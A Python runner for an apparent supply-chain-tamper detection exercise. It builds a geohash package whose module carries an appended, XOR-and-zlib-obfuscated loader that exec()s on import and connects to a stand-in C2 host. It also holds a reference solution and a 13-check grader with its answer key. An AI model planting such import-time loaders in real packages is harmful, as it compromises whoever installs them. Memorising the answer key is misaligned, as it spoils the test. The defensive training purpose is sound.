#!/usr/bin/env python3
"""Portable local runner for nw-mirror-tamper-v2 -- runs on Windows/Mac/Linux with
just Python, no Docker. It builds the environment in a temp folder, then either runs
the ORACLE solution (to prove the task is solvable + the verifier agrees) or lets you
SOLVE IT YOURSELF and grades your report.

Usage:
    python local_test.py            # build env + run oracle + grade  (proof it works)
    python local_test.py --manual   # build env only, print where it is, then wait;
                                     # you edit files + write report.json, press Enter,
                                     # and it grades your attempt like the real verifier.

This mirrors the real container verifier's checks; it does NOT replace the Docker /
rollout test, it just lets you inspect and try the task offline.
"""
import base64, zlib, os, hashlib, textwrap, tempfile, subprocess, sys, json, re, shutil, argparse

# ---------- build the environment into <root> (paths relocated from container) -------
def _w(path, text):
    # newline="" => no \n->\r\n translation on Windows, so on-disk bytes == text.encode()
    with open(path, "w", newline="") as f:
        f.write(text)


def build(root):
    SP = os.path.join(root, "site-packages"); PKG = os.path.join(SP, "geocache")
    MIRROR = os.path.join(root, "opt", "mirror", "geocache-lite-1.4.2")
    APP = os.path.join(root, "app"); SVC = os.path.join(APP, "service", "src", "svc")
    for d in (PKG, MIRROR, SVC):
        os.makedirs(d, exist_ok=True)

    clean_grid = textwrap.dedent('''
        """Geohash grid helpers."""
        _B32 = "0123456789bcdefghjkmnpqrstuvwxyz"
        def encode(lat, lon, prec=8):
            lat_r, lon_r = [-90.0, 90.0], [-180.0, 180.0]
            bits = ch = 0; even = True; out = []
            while len(out) < prec:
                if even:
                    mid = sum(lon_r) / 2
                    if lon >= mid: ch = (ch << 1) | 1; lon_r[0] = mid
                    else: ch = ch << 1; lon_r[1] = mid
                else:
                    mid = sum(lat_r) / 2
                    if lat >= mid: ch = (ch << 1) | 1; lat_r[0] = mid
                    else: ch = ch << 1; lat_r[1] = mid
                even = not even; bits += 1
                if bits == 5: out.append(_B32[ch]); bits = 0; ch = 0
            return "".join(out)
    ''')
    init_mod = 'from ._grid import encode\n__all__ = ["encode"]\n'

    stage2 = ('import socket, ssl, json, platform\n'
              'def _run():\n'
              '    host = "sync.pkg-telemetry-cdn.net"\n'
              '    try:\n'
              '        with socket.create_connection((host, 443), timeout=3) as s: pass\n'
              '    except Exception:\n'
              '        pass\n'
              '_run()\n')
    KEY = bytes.fromhex("5f3ac91e")
    z = zlib.compress(stage2.encode(), 9)
    xored = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(z))
    blob = base64.b64encode(xored).decode()
    appended = ('\n# --- vendor build cache (do not edit) ---\n'
                '_SALT = "%s"\n_DATA = "%s"\n'
                'def _c():\n    import base64 as _b, zlib as _z\n'
                '    k = bytes.fromhex(_SALT); raw = _b.b64decode(_DATA)\n'
                '    d = bytes(x ^ k[i %% len(k)] for i, x in enumerate(raw))\n'
                '    exec(compile(_z.decompress(d), "<c>", "exec"), {})\n'
                'try: _c()\nexcept Exception: pass\n') % (KEY.hex(), blob)
    tampered = clean_grid + appended

    _w(os.path.join(MIRROR, "_grid.py"), clean_grid)
    _w(os.path.join(MIRROR, "__init__.py"), init_mod)
    _w(os.path.join(PKG, "_grid.py"), tampered)
    _w(os.path.join(PKG, "__init__.py"), init_mod)

    di = os.path.join(SP, "geocache_lite-1.4.2.dist-info"); os.makedirs(di, exist_ok=True)
    def rh(t):
        return "sha256=" + base64.urlsafe_b64encode(hashlib.sha256(t.encode()).digest()).decode().rstrip("=")
    _w(os.path.join(di, "RECORD"), 
        "geocache/_grid.py,%s,%d\n" % (rh(clean_grid), len(clean_grid)))
    _w(os.path.join(SVC, "main.py"), "import geocache\n")

    # graders-only sidecar (portable equivalent of /opt/grader)
    _w(os.path.join(root, "grader_actual_hash"), hashlib.sha256(tampered.encode()).hexdigest())
    return dict(root=root, SP=SP, PKG=PKG, MIRROR=MIRROR, APP=APP,
                SIDECAR=os.path.join(root, "grader_actual_hash"),
                GRID=os.path.join(PKG, "_grid.py"),
                MIRROR_GRID=os.path.join(MIRROR, "_grid.py"),
                RECORD=os.path.join(di, "RECORD"),
                REPORT=os.path.join(APP, "report.json"),
                clean_hex=hashlib.sha256(clean_grid.encode()).hexdigest(),
                tamp_hex=hashlib.sha256(tampered.encode()).hexdigest())

# ---------- oracle: the reference solve ------------------------------------------------
def oracle(P):
    src = open(P["GRID"]).read()
    salt = bytes.fromhex(re.search(r'_SALT\s*=\s*"([0-9a-fA-F]+)"', src).group(1))
    data = base64.b64decode(re.search(r'_DATA\s*=\s*"([^"]+)"', src).group(1))
    dec = zlib.decompress(bytes(x ^ salt[i % len(salt)] for i, x in enumerate(data))).decode()
    host = re.search(r'host\s*=\s*"([^"]+)"', dec).group(1)
    report = {
        "compromised_package": "geocache-lite",
        "malicious_path": P["GRID"], "trigger": "import",
        "c2_host": host, "exfil_scheme": "https",
        "primary_cwe": "CWE-506", "owasp_a": "A06:2021",
        "recorded_hash": hashlib.sha256(open(P["MIRROR_GRID"], "rb").read()).hexdigest(),
        "actual_hash": hashlib.sha256(open(P["GRID"], "rb").read()).hexdigest(),
    }
    json.dump(report, open(P["REPORT"], "w"), indent=2)
    shutil.copy(P["MIRROR_GRID"], P["GRID"])          # restore

# ---------- verifier: the same 13 checks the container runs ---------------------------
def grade(P):
    results = []
    def chk(name, cond):
        results.append((name, bool(cond)))
    try:
        d = json.load(open(P["REPORT"]))
    except Exception as e:
        print("NO VALID report.json:", e); return 0.0
    KEYS = {"compromised_package","malicious_path","trigger","c2_host","exfil_scheme",
            "primary_cwe","owasp_a","recorded_hash","actual_hash"}
    recorded_b64 = None
    for line in open(P["RECORD"]):
        p = line.strip().split(",")
        if p[0] == "geocache/_grid.py" and len(p) >= 2 and p[1]:
            recorded_b64 = p[1].split("=", 1)[1]
    g = lambda k: str(d.get(k, "")).strip()
    chk("R1 exact keys", set(d) == KEYS)
    chk("R2 package", g("compromised_package").lower() == "geocache-lite")
    chk("R3 path", os.path.normpath(g("malicious_path")) == os.path.normpath(P["GRID"]))
    chk("R4 trigger", g("trigger").lower() == "import")
    chk("R5 c2_host", g("c2_host").lower() == "sync.pkg-telemetry-cdn.net")
    chk("R6 scheme", g("exfil_scheme").lower() == "https")
    chk("R7 cwe", g("primary_cwe").upper().replace(" ", "") == "CWE-506")
    chk("R8 owasp", g("owasp_a").upper().replace(" ", "") == "A06:2021")
    chk("R9 recorded_hash", g("recorded_hash").lower() == P["clean_hex"])
    expected = open(P["SIDECAR"]).read().strip().lower()
    chk("R10 actual_hash exact match", g("actual_hash").lower() == expected)
    installed = open(P["GRID"], "rb").read()
    b64 = base64.urlsafe_b64encode(hashlib.sha256(installed).digest()).decode().rstrip("=")
    chk("R11 restored matches manifest", b64 == recorded_b64)
    env = dict(os.environ, PYTHONPATH=P["SP"])
    hit = os.path.join(P["root"], "hit")
    probe = ("import socket\nh={'n':0}\ndef t(*a,**k):\n h['n']+=1; raise OSError()\n"
             "socket.create_connection=t\nimport geocache\nopen(r'%s','w').write(str(h['n']))\n" % hit)
    r = subprocess.run([sys.executable, "-c", probe], env=env)
    chk("R12 no payload on import", r.returncode == 0 and open(hit).read().strip() == "0")
    o = subprocess.run([sys.executable, "-c", "import geocache;print(geocache.encode(37.4,-122.1,9))"],
                       env=env, capture_output=True, text=True)
    chk("R13 functionality preserved", o.returncode == 0 and len(o.stdout.strip()) == 9)

    passed = sum(1 for _, ok in results if ok)
    for name, ok in results:
        print(("  PASS " if ok else "  FAIL ") + name)
    reward = passed / len(results)
    print("\nREWARD = %d/%d = %.3f" % (passed, len(results), reward))
    return reward

# ---------- main -----------------------------------------------------------------------
if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--manual", action="store_true",
                    help="build only, let you solve it yourself, then grade")
    args = ap.parse_args()
    root = tempfile.mkdtemp(prefix="nwmt_")
    P = build(root)
    print("Environment built at:\n  " + root)
    print("  site-packages : " + P["SP"])
    print("  clean mirror  : " + P["MIRROR"])
    print("  target file   : " + P["GRID"])
    print("  write report  : " + P["REPORT"])
    if args.manual:
        print("\n--- MANUAL MODE ---")
        print("Investigate the files above. Write your findings to report.json at the")
        print("'write report' path, remediate the target file, then press Enter to grade.")
        try:
            input("\nPress Enter when your report.json + fix are ready...")
        except EOFError:
            print("(no stdin; skipping manual grade)"); sys.exit(0)
        grade(P)
    else:
        print("\n--- ORACLE MODE (reference solve, proves the task works) ---")
        oracle(P)
        grade(P)
    print("\n(temp env left at %s -- delete when done)" % root)
